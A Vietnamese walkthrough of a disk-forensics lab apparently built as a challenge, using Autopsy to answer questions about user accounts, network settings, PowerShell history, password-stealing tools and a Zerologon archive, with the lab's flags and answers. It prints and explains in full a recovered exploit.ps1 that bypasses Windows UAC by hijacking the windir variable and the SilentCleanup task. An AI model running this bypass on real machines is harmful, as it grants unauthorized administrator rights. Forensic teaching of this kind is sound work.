## Disk Analysis & Autopsy

Đây là 1 lab để thực hành thêm 1 số kĩ năng cho autopsy, với lab có sẳn trong challenge, thực hiện phân tích images và trả lời các câu hỏi trong bài. Công cụ `autopsy` là một công cụ rất mạnh mẽ được dùng để phân tích các disk image do `FTK imager` tạo ra, dùng để phân tích filesystem (FAT16-32-exFAT, NTFS), phân tích về Internet History, email, khôi phục tệp,...

### **What is the MD5 hash of the E01 image?**

Để coi được MD5 hash của `E01` image chúng ta vào file `HASAN2.E01.txt` ở đây nó lưu chữ những metadata của file `HASAN2.E01` này.

<img width="1366" height="671" alt="image" src="https://github.com/user-attachments/assets/98804fee-f0ca-4bf6-aa5c-3e566e059b7c" />

`md5 hash`: 3f08c518adb3b5c1359849657a9b2079

<img width="460" height="180" alt="image" src="https://github.com/user-attachments/assets/1445db2d-3319-4990-b7f1-abf16c78a990" />

### **What is the computer account name?**

Để xem được thông tin của máy tính thì chúng ta vào phần OS information trong `autopsy`. Ở ngay phần `SYSTEM` chúng ta sẽ thấy tên của máy tính này là: `DESKTOP-0R59DJ3`.

<img width="1294" height="837" alt="image" src="https://github.com/user-attachments/assets/2e7130a8-c38b-49ca-85ce-0e78975dba22" />

### List all the user accounts. (alphabetical order)

Chúng ta vào phần `OS User Account` rồi sắp xếp phần Username theo bảng chữ cái.

<img width="1395" height="998" alt="image" src="https://github.com/user-attachments/assets/d61c861b-6e12-4e60-bc17-ad827c6e7abc" />

**Username list**: H4S4N,joshwa,keshav,sandhya,shreya,sivapriya,srini,suba

<img width="453" height="183" alt="image" src="https://github.com/user-attachments/assets/88f00610-11c9-4a0d-862d-56709d92fbb4" />

### Who was the last user to log into the computer?

<img width="890" height="693" alt="image" src="https://github.com/user-attachments/assets/14a1f118-dcd2-426f-95b9-c09c753aec0c" />

Chúng ta dựa vào cột `Date Accessed` để xét xem ai là người cuối đăng nhập.

<img width="462" height="184" alt="image" src="https://github.com/user-attachments/assets/8c327cb7-6f55-4dc7-a971-20d6f9de054a" />

### What was the IP address of the computer?

Ban đầu thì khi chúng ta muốn xem địa chỉ ip của một máy tính, thì chúng ta cần đi theo đường dẫn `HKLM/SYSTEM\Controlset001\Tcpip\Parameters\Interface\` thì tại vị trí này sẽ lưu địa chỉ ip của máy.

<img width="1915" height="1079" alt="image" src="https://github.com/user-attachments/assets/0e04a3a1-16b6-4709-b87a-e728b294592d" />

Nhưng mà tại đây thì địa chỉ ip đã xin request được ấp ip từ máy chủ DHCP thất bại nên xuất hiện hiện tượng là địa chỉ ip được ghi nhận trong `DHCPipAddress` là `0.0.0.0`, nên chúng ta phải làm theo cách khác. 

Sau một lúc tìm kiếm khá là bí bách, thì em có tìm thấy một thư mục tên là `Look@Lan` em lên mạng tìm hiểu đây là một công cụ giám sát mạng, nó cho phép quản lý những người dùng trong mạng cục bộ thông qua địa chỉ ip của mỗi máy client hoặc là tên người dùng. Vậy là chúng ta có manh mối tiếp theo rồi, bây giờ sẽ tiếp tục tìm kiếm trong các file thử xem.

<img width="1391" height="793" alt="image" src="https://github.com/user-attachments/assets/c57ec100-73ce-49f3-b39d-36889fe07b19" />

Tiếp theo em sẽ đọc một số file bên trong thư mục này, em để ý có file `.ini` thì thông thường nó sẽ sử dụng để lưu thông tin của các thông tin cấu hình của một máy tính. 

<img width="1398" height="787" alt="image" src="https://github.com/user-attachments/assets/d4e4d7d8-6354-4e27-85a4-caa78fd34916" />

Đâ chúng ta có thể thấy được ngay địa chỉ IP của máy tính này được lưu bên trong mục `$LANIP$`. `192.168.130.216`

<img width="458" height="180" alt="image" src="https://github.com/user-attachments/assets/9446c0b1-9c7b-466b-b292-df58848c6f64" />

### What was the MAC address of the computer? (XX-XX-XX-XX-XX-XX)

Ở đây thì ngay trong file `.ini` này chúng ta cũng có thể lấy được luôn địa chỉ MAC của giao diện mạng LAN trên máy tính này thông qua giá trị `$LANNIC$`. MAC_Address là địa chỉ duy nhất cho mỗi thiết bị mạng (NIC). `LANNIC` viết tắt cho (LAN Network Interface Card) địa chỉ card mạng duy nhất cho máy tính đó.

<img width="1401" height="794" alt="image" src="https://github.com/user-attachments/assets/6bb32da8-7059-4c9c-8e25-4e99740f364c" />

<img width="468" height="195" alt="image" src="https://github.com/user-attachments/assets/ba239f11-3697-498d-8b0d-03b70ea6873b" />

### What is the name of the network card on this computer?

`SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards`. Đây là vị trí mà network card được lưu trữ bên trong một máy tính. Bây giờ chúng ta cứ làm theo đường dẫn này là được. Nhưng mà trước hết, trong `autopsy` chúng ta không thể truy cập trực tiếp vào Windows NT nằm trong mục `Program files/Program files (x86)` được, bởi vì đường dẫn này bắt đầu từ hive `SOFTWARE`, thế nên chúng ta cần 
di theo đường dẫn này `Windows\System32\config\SOFTWARE` và bật tab application lên để bắt đầu tìm kiếm tên Card network.

<img width="1394" height="791" alt="image" src="https://github.com/user-attachments/assets/afb0ac2e-fa20-48a8-b2b4-9a4245b720b4" />

Sau đó tiếp tục di theo đường dẫn `SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkCards`, và tìm thấy được card mạng ở đây.

<img width="971" height="577" alt="image" src="https://github.com/user-attachments/assets/cd033e27-f632-42d9-9049-2695e599cd2b" />

<img width="440" height="214" alt="image" src="https://github.com/user-attachments/assets/ca64a402-a69e-40e3-a359-b3a1e257c1c3" />


### What is the name of the network monitoring tool?

Như ta đã tìm hiểu trước đó công cụ giám sát mạng trong một môi trường cục bộ được sử dụng là **Look@Lan**

<img width="436" height="185" alt="image" src="https://github.com/user-attachments/assets/9ab41bbd-3035-4360-bcff-766eedc65388" />

### A user bookmarked a Google Maps location. What are the coordinates of the location?

Bởi vì trong challenge này author đã cho chúng ta sẳn các mục rất cần thiết đã sẳn bên trong phần `Result`, hơn nữa còn có mục Web Bookmarks, chúng ta chỉ cần vào đây và tìm xem cái nào có đường dẫn đến google map là được.

<img width="426" height="431" alt="image" src="https://github.com/user-attachments/assets/951add0d-672a-4ede-993d-ebbd1f63bf0e" />

Thì đây chính là file `places.sqlite` chứa địa chỉ trên google map:

<img width="1414" height="872" alt="image" src="https://github.com/user-attachments/assets/a2e8192c-e580-4838-a66b-05bbb6bf7957" />

<img width="458" height="200" alt="image" src="https://github.com/user-attachments/assets/50634bfc-c41b-428a-8f97-f2cd3543acf9" />

### A user has his full name printed on his desktop wallpaper. What is the user's full name?

<img width="1415" height="884" alt="image" src="https://github.com/user-attachments/assets/d72a1c50-a81d-4df3-8464-d360ae469bcf" />

Câu này nhắc tới màn hình desktop thì em vào từng user, sau đó ban đầu em check trong thư mục desktop, nhưng không lưu hình ảnh nào, thì em chuyển qua thư mục downloads. Rồi dò một vài users thì em tìm được:

<img width="1415" height="884" alt="image" src="https://github.com/user-attachments/assets/c4a0c8ca-de04-4b91-9cd7-9832a88aef60" /> 

### A user had a file on her desktop. It had a flag but she changed the flag using PowerShell. What was the first flag

Đầu tiên thì như đề bảo là đây là một cô gái, nên em thực hiện xét cái tên trông giống nữ trước. Đầu tiên là `H4S4N` nhưng không có kết quả.

Tiếp theo em dò tới `Shreya`:

<img width="1395" height="796" alt="image" src="https://github.com/user-attachments/assets/11505f1b-c87b-4046-b437-d45e69d8c161" />

Vậy đây là người dùng đã thay đổi flag bằng cách sử dụng powershell, bây giờ mình chỉ cần check lịch sử powerhsell là được. Đi theo đường dẫn `%localAppData%\Roaming\Microsoft\Windows\Powershell\PSReadline\Console_history.txt`

<img width="1402" height="795" alt="image" src="https://github.com/user-attachments/assets/1b33de4a-b9fd-4259-8a9e-ce41203fd4b2" />

flag: `flag{HarleyQuinnForQueen}`

### The same user found an exploit to escalate privileges on the computer. What was the message to the device owner?

Ở đây chúng ta khi vào thư mục desktop của người dùng shreya, chúng ta cũng sẽ tìm được 1 file `exploit.ps1` file:

```
if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {

    #Payload goes here

    #It'll run as Administrator

    New-Item "C:\Users\H4S4N\Desktop\hacked.txt"

    Add-Content C:\Users\H4S4N\Desktop\hacked.txt 'Flag{I-hacked-you}'

    ##### https://youtu.be/C9GfMfFjhYI

} else {

    $registryPath = "HKCU:\Environment"

    $Name = "windir"

    $Value = "powershell -ep bypass -w h $PSCommandPath;#"

    Set-ItemProperty -Path $registryPath -Name $name -Value $Value

    #Depending on the performance of the machine, some sleep time may be required before or after schtasks

    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null

    Remove-ItemProperty -Path $registryPath -Name $name

}
```
Phân tích nội dung script này. Ban đầu nó sử dụng 1 hàm `System.Security.Principal.WindowsIdentity]::GetCurrent()` để check xem nó đang được chạy với user nào nếu trùng với "S-1-5-32-544" - tức là SID của administrator, thì nó sẽ thực hiện việc tạo 1 file hacked.txt trong thư mục desktop của `H4S4N`. Còn nếu không nó sẽ thực thi lệnh else là một khối tấn công khác.

Lệnh else tạo ra 3 biến `Name`, `registry Path`, `value`. Nó thực hiện tạo ra một biến môi trường `%windir%`, với một giá trị cho phép thực hiện lệnh powershell và bỏ qua các cơ chế bảo mật. Sau đó nó thực hiện chạy một `scheduler task` là `Silentcleanup` trong scheduler task thì tác vụ `Silentcleanup` cho phép nó chạy với đăng quyền cao nhất, theo đường dẫn `%windir%\system32\cleanmgr.exe`.

Khi đó attacker khai thác điều này hắn đổi biến `%windir%` thành một script khác `powershell -ep bypass -w h $PSCommandPath;#` lúc này cho phép hắn chạy script trong phần `$PScommandPath` với đặc quyền cao nhất, và sử dụng `#` để comment đoạn sau.

<img width="1441" height="796" alt="image" src="https://github.com/user-attachments/assets/c14d18e5-69d0-4027-91a5-f31760bce9fe" />

Vậy ta có flag là `Flag{I-hacked-you}`

### 2 hack tools focused on passwords were found in the system. What are the names of these tools? (alphabetical order)

Ở đây em sẽ tìm tòi ở một số user khác trong các thư mục download, document,... Để tìm xem họ có dùng những công cụ gì:

Thì đầu tiên em tìm thấy trong thư mục download của H4S4N có sử dụng công cụ `mimikatz`

<img width="1393" height="792" alt="image" src="https://github.com/user-attachments/assets/983267b8-3ff5-4335-b68d-d9773d950d11" />

Tiếp theo em sử dụng chỗ tìm kiếm từ khóa, và tìm đuôi `.exe` thử xem có kết quả không. Thi không có gì cả. Em nghĩ đây là một công cụ hack, thì chắc có thể là Windows Defender đã quét được nó, và chặn không cho nó tải xuống vào hệ thống, nên chúng ta có thể thử đi tìm kiếm trong thư mục Windows Defender `C:\Program Data\Microsoft\Windows Defender\Scan\History\Service\DetectionHistory` trong thư mục này em tìm hiểu trên mạng, thì nó sẽ chứa những file đã được tải về nhưng bị Windows Defender chặn và quét được.

Ở thư mục con đầu tiên chúng ta thấy được công cụ mimikatz đã bị quét, nhưng chưa bị xóa khỏi hệ thống nên chắc có thể đây là những lần quét của Windows Defender phát hiện công cụ đáng nghi, hoặc có thể nó đang bị nén nên windows defender không quét được files trong winrar đó. 

<img width="1391" height="786" alt="image" src="https://github.com/user-attachments/assets/bbd46f65-4715-42f7-85b7-7c3b7355bfec" />

Ở thư mục `02` chúng ta thấy được Windows Defender đã phát hiện được 1 công cụ `HackTools` tên là `Lazagne`, được user H4S4N tải xuống hệ thống nhưng đã bị chặn, chắc bởi vì đây là cả một file `.exe` nên quá rõ ràng và đáng nghi nên Windows Defender đã chặn nó. 

<img width="1397" height="797" alt="image" src="https://github.com/user-attachments/assets/fe06aa06-e7e8-46f4-befe-6e9f046e1ad7" />

<img width="1249" height="1385" alt="image" src="https://github.com/user-attachments/assets/65e0b7c7-9ef5-45b5-8ff7-5edbf7802a70" />

Ồ đây là công cụ thu thập mật khẩu, và 1 công cụ bẻ mật khẩu.

<img width="467" height="215" alt="image" src="https://github.com/user-attachments/assets/df164df3-f387-4d55-9ffc-5ef0b46beb6b" />

### There is a YARA file on the computer. Inspect the file. What is the name of the author?

Câu này vì đây là đuôi lạ nên em search thử file này là file gì rồi tìm kiếm thử trong `search keyword`. File `yara` là một file chứa các định nghĩa mẫu theo (form) để công cụ Yara có thể dùng để nhận diện các phần mềm độc hại. file yara có đuôi file là `yar`. Giờ chúng ta sử dụng công cụ `File Search Attribute` trong `autopsy` để tìm file. 

<img width="1427" height="850" alt="image" src="https://github.com/user-attachments/assets/f06f5f45-cebd-4614-95de-f66688e04543" />

Tên công cụ này là `kiwi_passwords.yar` và author của công cụ này là `Benjamin DEPLY "gentilkiwi"`

<img width="467" height="199" alt="image" src="https://github.com/user-attachments/assets/b9b2929a-635c-4c1b-8242-85aee65d303e" />

### One of the users wanted to exploit a domain controller with an MS-NRPC based exploit. What is the filename of the archive that you found? (include the spaces in your answer) 

Khi em tìm kiếm kĩ thuật `MS-NRPC exploit` thì nó trả về đây là một lỗ hổng [ZeroLogon](https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/zerologon-vulnerability/)

<img width="3212" height="1426" alt="image" src="https://github.com/user-attachments/assets/788bbd8c-c65b-4537-9074-4597c67f9e74" />

Em thực hiện tìm kiếm từ khóa này và nó trả về một kết quả trong thư mục `
/img_HASAN2.E01/vol_vol3/Users/sandhya/AppData/Roaming/Microsoft/Windows/Recent/2.2.0 20200918 Zerologon encrypted.lnk`. Vậy là chúng ta có thể hiểu được rằng. Người dùng `sandya` này đã bị thâm nhập vào thông qua một lỗ hổng cũ trong lỗ hổng `Zerologon` là `NetLogon`, sau đó hắn đã thực hiện leo quyền lên admin `H4S4N`, cài một script độc hại vào trong task Scheduler để nó thực thi mỗi ngày bên trong hệ thống cục bộ này. Có thể là hắn cũng đã sử dụng các công cụ như mimikatz để crack các mật khẩu của người dùng khác, và công cụ `lazagne` để thu thập các mật khẩu có thể lấy được trong môi trường miền cục bộ này.

<img width="1402" height="793" alt="image" src="https://github.com/user-attachments/assets/74273980-f669-4205-9d85-404ba15b08d7" />

<img width="1426" height="146" alt="image" src="https://github.com/user-attachments/assets/2b8aad48-1c2e-432f-bb11-0682832b8f98" />
